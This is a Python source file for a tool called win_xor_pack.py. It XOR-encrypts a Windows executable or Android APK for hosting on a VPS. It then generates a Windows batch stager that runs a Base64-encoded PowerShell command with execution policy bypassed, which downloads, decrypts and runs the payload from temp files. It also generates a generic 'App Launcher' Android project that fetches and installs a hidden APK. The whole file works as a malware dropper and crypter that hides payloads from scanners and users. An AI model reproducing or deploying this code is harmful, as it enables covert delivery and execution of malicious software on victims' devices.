#!/usr/bin/env python3
"""
win_xor_pack.py — Linux packer (VPS download mode)

  .exe / .bin  → Windows PE: thin .bat downloads, decrypts, runs
  .apk         → Android: encrypt payload for VPS + generate Android
                 launcher *project* you build into a real .apk
                 (output for users is an .apk, not a Windows .bat)

Interactive: python3 win_xor_pack.py
"""

from __future__ import annotations

import argparse
import base64
import gzip
import json
import sys
import textwrap
from pathlib import Path

INTERNAL_KEY = "WinXorPack-FixedKey-v1"

PE_SUFFIXES = {".exe", ".bin"}
APK_SUFFIXES = {".apk"}
ALL_SUFFIXES = PE_SUFFIXES | APK_SUFFIXES


def xor_crypt(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("Key must not be empty")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def looks_like_pe(data: bytes) -> bool:
    return len(data) >= 2 and data[0:2] == b"MZ"


def looks_like_apk(data: bytes) -> bool:
    return len(data) >= 2 and data[0:2] == b"PK"


def pack_payload(plain: bytes, key: bytes, compress: bool) -> tuple[bytes, str]:
    if compress:
        return xor_crypt(gzip.compress(plain, compresslevel=9), key), "gzip"
    return xor_crypt(plain, key), "raw"


def build_pe_bat(key: str, url: str, fmt: str) -> str:
    """
    Reliable Windows launcher: no cmd ^ line-continuations.
    Runs PowerShell via -EncodedCommand (UTF-16LE Base64).
    """
    ps_key = key.replace("'", "''")
    ps_url = url.replace("'", "''")

    if fmt == "gzip":
        gunzip_block = (
            "    $ms = New-Object System.IO.MemoryStream(,$dec)\n"
            "    $gs = New-Object System.IO.Compression.GzipStream("
            "$ms, [System.IO.Compression.CompressionMode]::Decompress)\n"
            "    $out = New-Object System.IO.MemoryStream\n"
            "    $gs.CopyTo($out)\n"
            "    $gs.Close()\n"
            "    $dec = $out.ToArray()\n"
        )
    else:
        gunzip_block = ""

    ps = (
        "$ErrorActionPreference = 'Stop'\n"
        f"$url = '{ps_url}'\n"
        f"$key = [System.Text.Encoding]::UTF8.GetBytes('{ps_key}')\n"
        f"$fmt = '{fmt}'\n"
        "$tmpEnc = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "
        "[System.Guid]::NewGuid().ToString() + '.enc')\n"
        "$tmpExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "
        "[System.Guid]::NewGuid().ToString() + '.exe')\n"
        "try {\n"
        "    Write-Host 'Downloading application payload...'\n"
        "    Invoke-WebRequest -Uri $url -OutFile $tmpEnc -UseBasicParsing\n"
        "    $enc = [System.IO.File]::ReadAllBytes($tmpEnc)\n"
        "    $dec = New-Object byte[] $enc.Length\n"
        "    for ($i = 0; $i -lt $enc.Length; $i++) {\n"
        "        $dec[$i] = $enc[$i] -bxor $key[$i % $key.Length]\n"
        "    }\n"
        "    if ($fmt -eq 'gzip') {\n"
        f"{gunzip_block}"
        "    }\n"
        "    if ($dec.Length -lt 2 -or $dec[0] -ne 0x4D -or $dec[1] -ne 0x5A) {\n"
        "        throw 'Decrypted payload is not a Windows PE (missing MZ header).'\n"
        "    }\n"
        "    [System.IO.File]::WriteAllBytes($tmpExe, $dec)\n"
        "    $p = Start-Process -FilePath $tmpExe -Wait -PassThru\n"
        "    exit $p.ExitCode\n"
        "}\n"
        "catch {\n"
        "    Write-Host $_\n"
        "    Write-Host 'Failed to download or run the application.'\n"
        "    Write-Host 'Check network, URL, and that the payload is a valid Windows program.'\n"
        "    exit 1\n"
        "}\n"
        "finally {\n"
        "    Remove-Item -LiteralPath $tmpEnc -Force -ErrorAction SilentlyContinue\n"
        "    Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue\n"
        "}\n"
    )
    encoded = base64.b64encode(ps.encode("utf-16le")).decode("ascii")

    lines = [
        "@echo off",
        "setlocal",
        'cd /d "%~dp0"',
        f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}",
        "set ERR=%ERRORLEVEL%",
        "if %ERR% NEQ 0 pause",
        "endlocal & exit /b %ERR%",
        "",
    ]
    return "\r\n".join(lines)


def write_android_launcher_project(out_dir: Path, key: str, url: str, fmt: str) -> Path:
    """
    Generate a minimal Android app project that:
      - downloads encrypted payload from url
      - XOR decrypts (+ gzip if needed)
      - writes an APK and launches the system package installer
    User must build with Android SDK / Android Studio → output is a real .apk
    """
    root = out_dir / "android_launcher"
    pkg = "com.xorpack.launcher"
    (root / "app/src/main/java/com/xorpack/launcher").mkdir(parents=True, exist_ok=True)
    (root / "app/src/main/res/values").mkdir(parents=True, exist_ok=True)
    (root / "app/src/main/res/xml").mkdir(parents=True, exist_ok=True)
    (root / "gradle/wrapper").mkdir(parents=True, exist_ok=True)

    # Config baked into Java source
    java = f'''package com.xorpack.launcher;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.GZIPInputStream;
import java.io.ByteArrayInputStream;

/**
 * Downloads encrypted APK from VPS, decrypts, opens system installer.
 * Not for Windows — install this launcher APK on an Android device.
 */
public class MainActivity extends Activity {{
    private static final String PAYLOAD_URL = {json.dumps(url)};
    private static final String XOR_KEY = {json.dumps(key)};
    private static final boolean USE_GZIP = {"true" if fmt == "gzip" else "false"};

    private TextView status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        status = new TextView(this);
        status.setText("Starting...");
        status.setPadding(48, 48, 48, 48);
        setContentView(status);
        new Thread(this::work).start();
    }}

    private void setStatus(String s) {{
        new Handler(Looper.getMainLooper()).post(() -> status.setText(s));
    }}

    private void work() {{
        try {{
            setStatus("Downloading payload...");
            byte[] enc = httpGet(PAYLOAD_URL);
            setStatus("Decrypting...");
            byte[] key = XOR_KEY.getBytes("UTF-8");
            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) {{
                dec[i] = (byte) (enc[i] ^ key[i % key.length]);
            }}
            if (USE_GZIP) {{
                dec = gunzip(dec);
            }}
            if (dec.length < 4 || dec[0] != 'P' || dec[1] != 'K') {{
                throw new IllegalStateException("Not a valid APK after decrypt");
            }}
            File out = new File(getCacheDir(), "payload.apk");
            try (FileOutputStream fos = new FileOutputStream(out)) {{
                fos.write(dec);
            }}
            setStatus("Opening installer...");
            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", out);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            setStatus("Installer launched. Enable install from this app if asked.");
        }} catch (Exception e) {{
            String msg = "Error: " + e.getMessage();
            setStatus(msg);
            new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(this, msg, Toast.LENGTH_LONG).show());
        }}
    }}

    private static byte[] httpGet(String urlStr) throws Exception {{
        HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
        c.setConnectTimeout(30000);
        c.setReadTimeout(120000);
        c.connect();
        if (c.getResponseCode() != 200) {{
            throw new IllegalStateException("HTTP " + c.getResponseCode());
        }}
        try (InputStream in = c.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream()) {{
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) >= 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        }}
    }}

    private static byte[] gunzip(byte[] data) throws Exception {{
        try (GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(data));
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {{
            byte[] buf = new byte[8192];
            int n;
            while ((n = gis.read(buf)) >= 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        }}
    }}
}}
'''
    (root / "app/src/main/java/com/xorpack/launcher/MainActivity.java").write_text(java, encoding="utf-8")

    (root / "app/src/main/AndroidManifest.xml").write_text(textwrap.dedent(f"""\
        <?xml version="1.0" encoding="utf-8"?>
        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
            <application
                android:allowBackup="false"
                android:label="App Launcher"
                android:supportsRtl="true"
                android:usesCleartextTraffic="true">
                <activity
                    android:name=".MainActivity"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>
                <provider
                    android:name="androidx.core.content.FileProvider"
                    android:authorities="{pkg}.provider"
                    android:exported="false"
                    android:grantUriPermissions="true">
                    <meta-data
                        android:name="android.support.FILE_PROVIDER_PATHS"
                        android:resource="@xml/file_paths" />
                </provider>
            </application>
        </manifest>
        """), encoding="utf-8")

    (root / "app/src/main/res/xml/file_paths.xml").write_text(textwrap.dedent("""\
        <?xml version="1.0" encoding="utf-8"?>
        <paths>
            <cache-path name="cache" path="." />
        </paths>
        """), encoding="utf-8")

    (root / "app/src/main/res/values/strings.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n<resources><string name="app_name">App Launcher</string></resources>\n',
        encoding="utf-8",
    )

    (root / "app/build.gradle").write_text(textwrap.dedent("""\
        plugins {
            id 'com.android.application'
        }
        android {
            namespace 'com.xorpack.launcher'
            compileSdk 34
            defaultConfig {
                applicationId "com.xorpack.launcher"
                minSdk 24
                targetSdk 34
                versionCode 1
                versionName "1.0"
            }
            buildTypes {
                release {
                    minifyEnabled false
                }
            }
            compileOptions {
                sourceCompatibility JavaVersion.VERSION_17
                targetCompatibility JavaVersion.VERSION_17
            }
        }
        dependencies {
            implementation 'androidx.appcompat:appcompat:1.6.1'
            implementation 'androidx.core:core:1.13.0'
        }
        """), encoding="utf-8")

    (root / "build.gradle").write_text(textwrap.dedent("""\
        plugins {
            id 'com.android.application' version '8.2.2' apply false
        }
        """), encoding="utf-8")

    (root / "settings.gradle").write_text(textwrap.dedent("""\
        pluginManagement {
            repositories {
                google()
                mavenCentral()
                gradlePluginPortal()
            }
        }
        dependencyResolutionManagement {
            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
            repositories {
                google()
                mavenCentral()
            }
        }
        rootProject.name = "XorPackLauncher"
        include ':app'
        """), encoding="utf-8")

    (root / "gradle.properties").write_text(
        "org.gradle.jvmargs=-Xmx2048m\nandroid.useAndroidX=true\n",
        encoding="utf-8",
    )

    (root / "BUILD.txt").write_text(textwrap.dedent("""\
        Build the Android launcher APK
        ==============================

        Prerequisites:
          - Android Studio (recommended) OR Android SDK + JDK 17
          - Network to download Gradle/dependencies on first build

        Option A — Android Studio
          1. Open this folder (android_launcher) in Android Studio
          2. Let it sync Gradle
          3. Build → Build Bundle(s) / APK(s) → Build APK(s)
          4. Output: app/build/outputs/apk/debug/app-debug.apk
             (or release if you configure signing)

        Option B — command line (SDK installed, ANDROID_HOME set)
          cd android_launcher
          # If wrapper missing, open once in Android Studio to generate it, or:
          gradle wrapper   # if system gradle exists
          ./gradlew :app:assembleDebug
          # APK: app/build/outputs/apk/debug/app-debug.apk

        Install on device:
          adb install -r app/build/outputs/apk/debug/app-debug.apk

        On the phone:
          - Allow install from this source if prompted
          - Open "App Launcher" → it downloads, decrypts, opens installer for your real APK

        Upload the encrypted payload (app.enc) to the URL you configured before building.
        """), encoding="utf-8")

    return root


def prompt(msg: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"{msg}{suffix}: ").strip()
        if val:
            return val
        if default is not None:
            return default
        print("  Please enter a value.")


def prompt_yes_no(msg: str, default: bool = False) -> bool:
    d = "Y/n" if default else "y/N"
    while True:
        val = input(f"{msg} [{d}]: ").strip().lower()
        if not val:
            return default
        if val in ("y", "yes"):
            return True
        if val in ("n", "no"):
            return False
        print("  Enter y or n.")


def interactive() -> dict:
    print()
    print("=" * 60)
    print("  XOR Packer — VPS mode")
    print("  .exe/.bin → Windows .bat launcher")
    print("  .apk      → Android launcher *project* → you build a .apk")
    print("=" * 60)
    print()

    while True:
        path = Path(prompt("Path to file (.exe, .bin, or .apk)")).expanduser().resolve()
        if not path.is_file():
            print(f"  Not found: {path}")
            continue
        suf = path.suffix.lower()
        if suf not in ALL_SUFFIXES:
            print("  Use .exe, .bin, or .apk")
            continue
        data = path.read_bytes()
        kind = "apk" if suf in APK_SUFFIXES else "pe"
        if kind == "pe" and not looks_like_pe(data):
            if not prompt_yes_no("  No MZ header — continue?", default=False):
                continue
        if kind == "apk" and not looks_like_apk(data):
            if not prompt_yes_no("  No PK header — continue?", default=False):
                continue
        break

    out_dir = Path(prompt("Output directory", str(Path.cwd() / "xor_out"))).expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    payload_name = prompt("Encrypted payload filename on VPS", "app.enc")
    print()
    print("URL where the encrypted payload will be hosted (HTTPS recommended):")
    url = prompt("Download URL")
    compress = prompt_yes_no("Gzip before XOR?", default=True)

    print()
    print("Summary")
    print(f"  Input   : {path} ({kind})")
    print(f"  Payload : {out_dir / payload_name}")
    print(f"  URL     : {url}")
    if kind == "apk":
        print("  Output  : Android Studio project → build app-debug.apk for devices")
    else:
        print("  Output  : Windows run.bat")
    print()
    if not prompt_yes_no("Proceed?", default=True):
        sys.exit("Cancelled.")

    return {
        "path": path,
        "kind": kind,
        "out_dir": out_dir,
        "payload_path": out_dir / payload_name,
        "url": url,
        "compress": compress,
    }


def run_pack(cfg: dict, key: str) -> None:
    plain = cfg["path"].read_bytes()
    encrypted, fmt = pack_payload(plain, key.encode(), cfg["compress"])
    cfg["payload_path"].write_bytes(encrypted)

    if cfg["kind"] == "apk":
        proj = write_android_launcher_project(cfg["out_dir"], key, cfg["url"], fmt)
        print()
        print("Done (Android APK pipeline).")
        print(f"  Encrypted payload : {cfg['payload_path']} ({len(encrypted):,} bytes, {fmt})")
        print(f"  Upload it so this URL works: {cfg['url']}")
        print(f"  Launcher project  : {proj}")
        print()
        print("  Build a real .apk for Android:")
        print("    1. Open android_launcher/ in Android Studio")
        print("    2. Build → Build APK(s)")
        print("    3. Install app-debug.apk on the phone")
        print("    4. User opens App Launcher → downloads → decrypts → system installer")
        print()
        print("  See android_launcher/BUILD.txt for details.")
        print("  Note: this Python tool cannot emit a finished .apk without Android SDK;")
        print("  the project is generated so your output *for users* is an .apk after build.")
    else:
        bat_path = cfg["out_dir"] / "run.bat"
        bat_path.write_text(build_pe_bat(key, cfg["url"], fmt), encoding="utf-8", newline="\r\n")
        print()
        print("Done (Windows PE pipeline).")
        print(f"  Encrypted payload : {cfg['payload_path']}")
        print(f"  URL               : {cfg['url']}")
        print(f"  Windows launcher  : {bat_path}")


def main() -> None:
    parser = argparse.ArgumentParser(description="XOR-pack .exe/.bin/.apk for VPS hosting")
    parser.add_argument("input", nargs="?")
    parser.add_argument("-o", "--output-dir", default=None)
    parser.add_argument("--url", default=None)
    parser.add_argument("--payload-name", default="app.enc")
    parser.add_argument("--compress", action="store_true")
    parser.add_argument("--no-compress", action="store_true")
    parser.add_argument("-i", "--interactive", action="store_true")
    parser.add_argument("-k", "--key", default=None)
    args = parser.parse_args()
    key = args.key or INTERNAL_KEY

    if args.interactive or not args.input or not args.url:
        cfg = interactive()
        if args.compress:
            cfg["compress"] = True
        if args.no_compress:
            cfg["compress"] = False
    else:
        path = Path(args.input).expanduser().resolve()
        if not path.is_file():
            sys.exit(f"Not found: {path}")
        suf = path.suffix.lower()
        if suf not in ALL_SUFFIXES:
            sys.exit("Need .exe, .bin, or .apk")
        out_dir = Path(args.output_dir or "./xor_out").expanduser().resolve()
        out_dir.mkdir(parents=True, exist_ok=True)
        cfg = {
            "path": path,
            "kind": "apk" if suf in APK_SUFFIXES else "pe",
            "out_dir": out_dir,
            "payload_path": out_dir / args.payload_name,
            "url": args.url,
            "compress": bool(args.compress) and not args.no_compress,
        }

    cfg["out_dir"].mkdir(parents=True, exist_ok=True)
    run_pack(cfg, key)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCancelled.")
        sys.exit(130)
